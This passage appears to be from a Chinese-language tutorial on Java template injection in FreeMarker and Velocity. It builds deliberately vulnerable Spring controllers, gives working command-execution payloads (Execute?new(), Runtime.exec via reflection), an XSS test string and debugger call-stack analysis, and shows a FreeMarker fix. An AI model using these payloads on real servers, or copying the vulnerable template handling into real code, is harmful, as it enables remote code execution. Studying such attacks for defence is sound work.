<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-freemarker<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第三：添加配置文件<br>application.yml</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">freemarker:</span></span><br><span class="line">    <span class="comment">#指定HttpServletRequest的属性是否可以覆盖controller的model的同名项</span></span><br><span class="line">    <span class="attr">allow-request-override:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment">#req访问request</span></span><br><span class="line">    <span class="attr">request-context-attribute:</span> <span class="string">req</span></span><br><span class="line">    <span class="comment">#后缀名freemarker默认后缀为.ftl，当然你也可以改成自己习惯的.html</span></span><br><span class="line">    <span class="attr">suffix:</span> <span class="string">.html</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#设置响应的内容类型</span></span><br><span class="line">    <span class="attr">content-type:</span> <span class="string">text/html;charset=utf-8</span></span><br><span class="line">    <span class="comment">#是否允许mvc使用freemarker</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment">#是否开启template caching</span></span><br><span class="line">    <span class="attr">cache:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment">#设定模板的加载路径，多个以逗号分隔，默认: [“classpath:/templates/”]</span></span><br><span class="line">    <span class="attr">template-loader-path:</span> <span class="string">classpath:/templates/</span></span><br><span class="line">    <span class="comment">#设定Template的编码</span></span><br><span class="line">    <span class="attr">charset:</span> <span class="string">UTF-8</span></span><br></pre></td></tr></table></figure>

<p>第四：创建Controller（HelloController）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javasecssti;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@RequestParam</span> Map&lt;String, Object&gt; params, Model model)</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;name&quot;</span>, params.get(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第五：创建对应的视图文件（hello.html）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>SSTI<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>name:$&#123;name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第六：运行访问，访问&#x2F;hello，使用get请求提交name值即可将其渲染至页面<br>测试xss：如果提交的name值为<code>&lt;script&gt;alert(&#39;a&#39;)&lt;/script&gt;</code>，在不经过如何过滤的情况下，会将该值渲染到界面造成弹窗<br>测试命令执行：在hello.html中写入如下命令执行POC<br><code>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;cmd /C calc&quot;) &#125;</code><br>这样在访问&#x2F;hello时，会触发命令执行，弹出计算器</p>
<h2 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h2><p>在freemarker\template\utility\Execute.class类的exec方法处下断点<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">75</span>, Execute (freemarker.template.utility)</span><br><span class="line">_eval:<span class="number">62</span>, MethodCall (freemarker.core)</span><br><span class="line">eval:<span class="number">101</span>, Expression (freemarker.core)</span><br><span class="line">calculateInterpolatedStringOrMarkup:<span class="number">100</span>, DollarVariable (freemarker.core)</span><br><span class="line">accept:<span class="number">63</span>, DollarVariable (freemarker.core)</span><br><span class="line">visit:<span class="number">334</span>, Environment (freemarker.core)</span><br><span class="line">visit:<span class="number">340</span>, Environment (freemarker.core)</span><br><span class="line">process:<span class="number">313</span>, Environment (freemarker.core)</span><br><span class="line">process:<span class="number">383</span>, Template (freemarker.template)</span><br><span class="line">processTemplate:<span class="number">391</span>, FreeMarkerView (org.springframework.web.servlet.view.freemarker)</span><br><span class="line">doRender:<span class="number">304</span>, FreeMarkerView (org.springframework.web.servlet.view.freemarker)</span><br><span class="line">renderMergedTemplateModel:<span class="number">255</span>, FreeMarkerView (org.springframework.web.servlet.view.freemarker)</span><br><span class="line">renderMergedOutputModel:<span class="number">179</span>, AbstractTemplateView (org.springframework.web.servlet.view)</span><br><span class="line">render:<span class="number">316</span>, AbstractView (org.springframework.web.servlet.view)</span><br><span class="line">render:<span class="number">1373</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processDispatchResult:<span class="number">1118</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doDispatch:<span class="number">1057</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">943</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:<span class="number">898</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">626</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">733</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">231</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">119</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">119</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">119</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">202</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">97</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">542</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">143</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">374</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">868</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1590</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1142</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>观察exec方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230913154355.png"></p>
<h2 id="修复防御"><a href="#修复防御" class="headerlink" title="修复防御"></a>修复防御</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Configuration</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置模板</span></span><br><span class="line">HashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span><span class="string">&quot;&lt;#assign aaa=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123; aaa(\&quot;open -a Calculator.app\&quot;) &#125;&quot;</span>;</span><br><span class="line">System.out.println(poc);</span><br><span class="line"><span class="type">StringTemplateLoader</span> <span class="variable">stringLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTemplateLoader</span>();</span><br><span class="line"><span class="type">Configuration</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">stringLoader.putTemplate(<span class="string">&quot;name&quot;</span>,poc);</span><br><span class="line">cfg.setTemplateLoader(stringLoader);</span><br><span class="line"><span class="comment">//cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);</span></span><br><span class="line"><span class="comment">//处理解析模板</span></span><br><span class="line"><span class="type">Template</span> <span class="variable">Template_name</span> <span class="operator">=</span> cfg.getTemplate(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">StringWriter</span> <span class="variable">stringWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line"></span><br><span class="line">Template_name.process(Template_name,stringWriter);</span><br></pre></td></tr></table></figure>

<p>设置<code>cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);</code>，它会加入一个校验，将freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor过滤</p>
<p>分析TemplateClassResolver.SAFER_RESOLVER</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplateClassResolver</span> <span class="variable">SAFER_RESOLVER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplateClassResolver</span>() &#123;</span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">resolve</span><span class="params">(String className, Environment env, Template template)</span> <span class="keyword">throws</span> TemplateException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!className.equals(ObjectConstructor.class.getName()) &amp;&amp; !className.equals(Execute.class.getName()) &amp;&amp; !className.equals(<span class="string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ClassUtil.forName(className);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">_MiscTemplateException</span>(var5, env);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> _MessageUtil.newInstantiatingClassNotAllowedException(className, env);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>从 2.3.17版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：<br>1、UNRESTRICTED_RESOLVER：可以通过 ClassUtil.forName(className) 获取任何类。<br>2、SAFER_RESOLVER：不能加载 freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor这三个类。<br>3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。</p>
<p>可通过freemarker.core.Configurable#setNewBuiltinClassResolver方法设置TemplateClassResolver，从而限制通过new()函数对freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor这三个类的解析</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://freemarker.apache.org/">FreeMarker Java Template Engine (apache.org)</a><br><a href="https://www.cnblogs.com/nice0e3/p/16217471.html">Java安全之freemarker 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a href="https://xz.aliyun.com/t/12637">FreeMarker入门到简要分析模版注入</a><br><a href="https://paper.seebug.org/1304/">逃逸安全的模板沙箱（一）——FreeMarker（上） (seebug.org)</a></p>
<h1 id="velocity"><a href="#velocity" class="headerlink" title="velocity"></a>velocity</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>官方文档介绍：<br>Velocity is a Java-based template engine. It permits anyone to use a simple yet powerful template language to reference objects defined in Java code.<br>在基于MVC模型开发时，Velocity可作为view引擎，取代jsp<br>官方文档：<a href="https://velocity.apache.org/">https://velocity.apache.org/</a></p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>**#**：标识velocity的脚本语句<br>#set、#if、#else、#end、#foreach、#include、#parse、#macro<br>**$**：标识变量，如hello $a<br><strong>声明</strong>：set用于声明Velocity脚本变量<br><strong>注释</strong>：<br>单行注释用<code>##</code>，多行注释用<code>#*......*#</code><br>**{}**：用来明确标识Velocity变量<br>**!**：强制把不存在的变量显示为空白<br>参考文档：<a href="https://wizardforcel.gitbooks.io/velocity-doc/content/index.html">https://wizardforcel.gitbooks.io/velocity-doc/content/index.html</a></p>
<h2 id="常见POC"><a href="#常见POC" class="headerlink" title="常见POC"></a>常见POC</h2><p>web程序中弹出msg的例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#if($msg)</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;$!msg&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#end</span><br></pre></td></tr></table></figure>

<p>命令执行POC：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// 命令执行1</span><br><span class="line">#set($e=&quot;e&quot;)</span><br><span class="line">$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;open -a Calculator&quot;)</span><br><span class="line"></span><br><span class="line">// 命令执行2 </span><br><span class="line">#set($x=&#x27;&#x27;)##</span><br><span class="line">#set($rt = $x.class.forName(&#x27;java.lang.Runtime&#x27;))##</span><br><span class="line">#set($chr = $x.class.forName(&#x27;java.lang.Character&#x27;))##</span><br><span class="line">#set($str = $x.class.forName(&#x27;java.lang.String&#x27;))##</span><br><span class="line">#set($ex=$rt.getRuntime().exec(&#x27;id&#x27;))##</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())##</span><br><span class="line">#foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br><span class="line"></span><br><span class="line">// 命令执行3</span><br><span class="line">#set ($e=&quot;exp&quot;)</span><br><span class="line">#set ($a=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))</span><br><span class="line">#set ($input=$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))</span><br><span class="line">#set($sc = $e.getClass().forName(&quot;java.util.Scanner&quot;))</span><br><span class="line">#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))</span><br><span class="line">#set($scan=$constructor.newInstance($input).useDelimiter(&quot;\A&quot;))</span><br><span class="line">#if($scan.hasNext())</span><br><span class="line">$scan.next()</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>

<h2 id="简单例子-1"><a href="#简单例子-1" class="headerlink" title="简单例子"></a>简单例子</h2><p>第一：导入依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二：编写VelocityController</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javasecssti;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.Velocity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VelocityController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/ssti/velocity&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">velocity1</span><span class="params">(<span class="meta">@RequestParam(defaultValue=&quot;nth347&quot;)</span> String username)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">templateString</span> <span class="operator">=</span> <span class="string">&quot;Hello, &quot;</span> + username + <span class="string">&quot; | Full name: $name, phone: $phone, email: $email&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Velocity.init();</span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">        ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Nguyen Nguyen Nguyen&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;012345678&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;nguyen@vietnam.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        <span class="comment">// 将模板字符串和上下文对象传递给Velocity引擎进行解析和渲染</span></span><br><span class="line">        Velocity.evaluate(ctx, out, <span class="string">&quot;test&quot;</span>, templateString);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> out.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第三：启动测试<br>poc</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">#set($e=&quot;e&quot;)</span><br><span class="line">$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;cmd /C calc&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230913212554.png"><br>命令执行成功，弹出计算器</p>
<h2 id="简单分析-1"><a href="#简单分析-1" class="headerlink" title="简单分析"></a>简单分析</h2><p>根据测试程序，首先会进入Velocity类的init方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    RuntimeSingleton.init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在该方法中，会调用RuntimeSingleton类的init方法，这个方法主要是对模板引擎的初始化，比如设置属性、初始化日志系统、资源管理器、指令等<br>接下来回到主程序中，实例化VelocityContext，并将三对键值对put进去，之后调用Velocity类的evaluate方法<br>此时templateString的值为</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Hello, #set($e=&quot;e&quot;)</span><br><span class="line">$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;cmd /C calc&quot;) | Full name: $name, phone: $phone, email: $email</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">evaluate</span><span class="params">(Context context, Writer out, String logTag, String instring)</span> <span class="keyword">throws</span> ParseErrorException, MethodInvocationException, ResourceNotFoundException &#123;</span><br><span class="line">    <span class="keyword">return</span> RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接进入了RuntimeInstance的evaluate方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">evaluate</span><span class="params">(Context context, Writer out, String logTag, String instring)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.evaluate(context, out, logTag, (Reader)(<span class="keyword">new</span> <span class="title class_">StringReader</span>(instring)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入重载的evaluate方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230913222148.png"><br>这个方法会调用RuntimeInstance类的parse方法进行解析<br>经过两重调用来到org\apache\velocity\runtime\parser\Parser.class的parse方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> SimpleNode <span class="title function_">parse</span><span class="params">(Reader reader, String templateName)</span> <span class="keyword">throws</span> ParseException &#123;</span><br><span class="line">    <span class="type">SimpleNode</span> <span class="variable">sn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">this</span>.currentTemplateName = templateName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 清除词法分析器的状态变量</span></span><br><span class="line">        <span class="built_in">this</span>.token_source.clearStateVars();</span><br><span class="line">        <span class="comment">// 使用传入的Reader对象重新初始化字符流</span></span><br><span class="line">        <span class="built_in">this</span>.velcharstream.ReInit(reader, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 使用重新初始化的字符流重新初始化语法分析器</span></span><br><span class="line">        <span class="built_in">this</span>.ReInit((CharStream)<span class="built_in">this</span>.velcharstream);</span><br><span class="line">        <span class="comment">// 进行模板解析</span></span><br><span class="line">        sn = <span class="built_in">this</span>.process();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (MacroParseException var6) &#123;</span><br><span class="line">        <span class="built_in">this</span>.rsvc.getLog().error(<span class="string">&quot;Parser Error: &quot;</span> + templateName, var6);</span><br><span class="line">        <span class="keyword">throw</span> var6;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ParseException var7) &#123;</span><br><span class="line">        <span class="built_in">this</span>.rsvc.getLog().error(<span class="string">&quot;Parser Exception: &quot;</span> + templateName, var7);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TemplateParseException</span>(var7.currentToken, var7.expectedTokenSequences, var7.tokenImage, <span class="built_in">this</span>.currentTemplateName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (TokenMgrError var8) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ParseException</span>(<span class="string">&quot;Lexical error: &quot;</span> + var8.toString());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Parser Error: &quot;</span> + templateName;</span><br><span class="line">        <span class="built_in">this</span>.rsvc.getLog().error(msg, var9);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">VelocityException</span>(msg, var9);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.currentTemplateName = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> sn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行完process方法后，sn的值如下：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230913223520.png"><br>到目前为止，解析工作完成，函数调用栈如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">process:<span class="number">282</span>, Parser (org.apache.velocity.runtime.parser)</span><br><span class="line">parse:<span class="number">117</span>, Parser (org.apache.velocity.runtime.parser)</span><br><span class="line">parse:<span class="number">1226</span>, RuntimeInstance (org.apache.velocity.runtime)</span><br><span class="line">parse:<span class="number">1181</span>, RuntimeInstance (org.apache.velocity.runtime)</span><br><span class="line">evaluate:<span class="number">1297</span>, RuntimeInstance (org.apache.velocity.runtime)</span><br><span class="line">evaluate:<span class="number">1265</span>, RuntimeInstance (org.apache.velocity.runtime)</span><br><span class="line">evaluate:<span class="number">180</span>, Velocity (org.apache.velocity.app)</span><br><span class="line">velocity1:<span class="number">26</span>, VelocityController (com.example.javasecssti)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">doInvoke:<span class="number">190</span>, InvocableHandlerMethod (org.springframework.web.method.support)</span><br><span class="line">invokeForRequest:<span class="number">138</span>, InvocableHandlerMethod (org.springframework.web.method.support)</span><br><span class="line">invokeAndHandle:<span class="number">105</span>, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">invokeHandlerMethod:<span class="number">878</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handleInternal:<span class="number">792</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handle:<span 